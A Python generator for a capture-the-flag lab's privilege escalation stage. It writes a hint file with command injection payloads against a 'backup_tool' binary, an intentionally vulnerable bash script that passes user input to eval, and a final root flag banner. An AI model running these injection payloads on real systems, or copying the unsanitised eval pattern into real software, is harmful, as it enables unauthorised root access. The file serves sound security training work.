from pathlib import Path

class PrivEscChallenge:
    """Creates privilege escalation challenge files"""
    
    def __init__(self, output_dir, flags):
        self.output_dir = Path(output_dir)
        self.flags = flags
    
    def create(self):
        """Create privilege escalation challenge components"""
        self._create_suid_info()
        self._create_vulnerable_script()
        self._create_root_flag()
        print("[+] Created privilege escalation challenge")
    
    def _create_suid_info(self):
        """Create SUID binary information"""
        suid_info = f"""# SUID Binaries

## Finding SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

## SUID Binaries on System

### Standard Binaries
- /usr/bin/sudo
- /usr/bin/passwd
- /usr/bin/gpasswd
- /usr/bin/newgrp
- /usr/bin/chsh
- /usr/bin/chfn

### Vulnerable Binary
- **/usr/local/bin/backup_tool** ⚠️ VULNERABLE!

## Vulnerability: Command Injection

The backup_tool binary doesn't properly sanitize input.

### Usage
```bash
/usr/local/bin/backup_tool "filename"
```

### Exploitation
```bash
# Command injection
/usr/local/bin/backup_tool "test.txt; cat /root/flag.txt"
/usr/local/bin/backup_tool "test.txt; /bin/bash"
/usr/local/bin/backup_tool "test.txt; id"
```

## Flag 5
After successful privilege escalation, Flag 5 will be accessible:
`{self.flags['flag5_privesc']}`

## Alternative Methods

### Sudo Rights
```bash
sudo -l
```

### Writable /etc/passwd
```bash
ls -la /etc/passwd
```

### Kernel Exploits
```bash
uname -a
searchsploit linux kernel
```
"""
        
        with open(self.output_dir / 'SUID_INFO.txt', 'w') as f:
            f.write(suid_info)
    
    def _create_vulnerable_script(self):
        """Create vulnerable backup script"""
        script = f"""#!/bin/bash
# Vulnerable Backup Tool
# This script has command injection vulnerability

if [ -z "$1" ]; then
    echo "Usage: $0 <filename>"
    exit 1
fi

FILENAME=$1

echo "[*] Starting backup..."
echo "[*] Backing up: $FILENAME"

# VULNERABLE: No input sanitization!
eval "tar -czf /tmp/backup.tar.gz $FILENAME"

echo "[*] Backup complete"
echo "[*] Saved to: /tmp/backup.tar.gz"

# Flag 5: {self.flags['flag5_privesc']}
"""
        
        script_dir = self.output_dir / 'usr' / 'local' / 'bin'
        script_file = script_dir / 'backup.sh'
        
        with open(script_file, 'w') as f:
            f.write(script)
        
        # Make executable
        script_file.chmod(0o755)
    
    def _create_root_flag(self):
        """Create final root flag"""
        root_flag = f"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║              🎉 CONGRATULATIONS! 🎉                               ║
║                                                                   ║
║         You've Successfully Completed Week 1 CTF!                 ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝

Final Flag: {self.flags['flag6_final']}

═══════════════════════════════════════════════════════════════════

📊 CHALLENGE COMPLETION SUMMARY

You successfully:
✓ Performed comprehensive reconnaissance
✓ Exploited SQL injection vulnerability
✓ Obtained shell access through file upload
✓ Enumerated the system and found credentials
✓ Escalated privileges to root
✓ Captured all 6 flags!

═══════════════════════════════════════════════════════════════════

🏆 SKILLS DEMONSTRATED

Week 1 Skills Mastered:
✓ Information Gathering & OSINT
✓ Web Application Vulnerability Assessment
✓ SQL Injection Exploitation
✓ File Upload Exploitation
✓ Web Shell Deployment
✓ Reverse Shell Establishment
✓ System Enumeration
✓ Credential Harvesting
✓ Privilege Escalation
✓ Complete Attack Chain Execution

═══════════════════════════════════════════════════════════════════

📈 NEXT STEPS

You're now ready for Week 2!

Upcoming topics:
- Advanced Persistence Techniques
- Lateral Movement
- Domain Compromise
- Data Exfiltration
- Covering Tracks
- Red Team Operations

═══════════════════════════════════════════════════════════════════

💡 FEEDBACK

Share your experience:
- What was most challenging?
- What did you learn?
- How long did it take?
- Any suggestions for improvement?

═══════════════════════════════════════════════════════════════════

Thank you for completing the Week 1 CTF Challenge!

Keep learning, keep practicing, and happy hacking! 🚀

═══════════════════════════════════════════════════════════════════
"""
        
        root_dir = self.output_dir / 'root'
        with open(root_dir / 'flag.txt', 'w') as f:
            f.write(root_flag)